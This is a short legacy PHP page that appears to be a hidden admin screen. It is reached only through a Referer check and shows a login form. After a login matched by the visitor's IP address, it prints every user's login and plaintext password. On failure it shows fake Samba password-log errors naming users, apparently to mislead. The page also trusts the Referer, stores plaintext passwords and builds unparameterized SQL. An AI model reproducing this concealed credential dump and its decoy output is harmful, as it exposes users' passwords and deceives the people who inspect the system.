<html><head></head>
<?PHP
include("config.php");
include("identity.php");
include("header.php");
if (strpos(getenv(HTTP_REFERER),"news.php"))
	{
	echo "<p><br><p><br>";
	echo "<form method='post' action='humptydumpty.php'>";
	echo "<center><table width='350' border='0' cellpadding='0' cellspacing='0'>";
	echo "<tr><td align='right'>Login: </td><td><input type='text' name='login'></td></tr>";
	echo "<tr><td align='right'>Password: </td><td><input type='password' name='password'></td></tr>";
	echo "<tr><td colspan='2' align='right'><input type='submit' value='Submit'></td></tr>";
	echo "</table>";
	}
if (strpos(getenv(HTTP_REFERER),"humptydumpty.php"))
	{
	dbconnect($dbusername,$dbuserpasswd);
	$result = mysql_query( "select default_bgcolor, default_fontsize, default_fontface, default_fontcolor,
				heading_bgcolor, heading_fontsize, heading_fontface, heading_fontcolor, login, firstname, password
				from userinfo where ipaddress ='$ipaddy'");
	$setting = mysql_fetch_array($result);
	if ($setting["login"] == $login and $setting["password"] == $password)
		{
		echo "<center><br><p><table cellpadding='2' cellspacing='2' border='2'>";
		$result = mysql_query("select login, password from userinfo order by lastname");
		while ($row = mysql_fetch_array($result))
			{
			echo "<tr><td><i>", $row["login"], "</i></td><td align='right'><b>", $row["password"], "</b></td></tr>";
			}
		echo "</table>";
		} else {
			echo "<br>2000/03/30 10:06:57, 1] smbd/password.c:pass_check_smb(492)";
			echo "<br>Couldn't find user 'susan' in UNIX password database.";
                        echo "<br>[2000/03/07 12:02:58, 1] smbd/password.c:pass_check_smb(528)";
			echo "<br>smb_password_check failed. Invalid password given for user 'bholcomb'";
	                echo "<br>[2000/04/13 11:01:48, 1] smbd/password.c:pass_check_smb(528)";
			echo "<br>smb_password_check failed. Invalid password given for user 'cebersol'";
	                echo "<br>[2000/02/21 09:10:19, 1] smbd/password.c:pass_check_smb(528)";
			echo "<br>smb_password_check failed. Invalid password given for user 'jlindsay'";
			echo "<br>ERROR: The script may have failed.";
			}

	}
?>
</body></html>
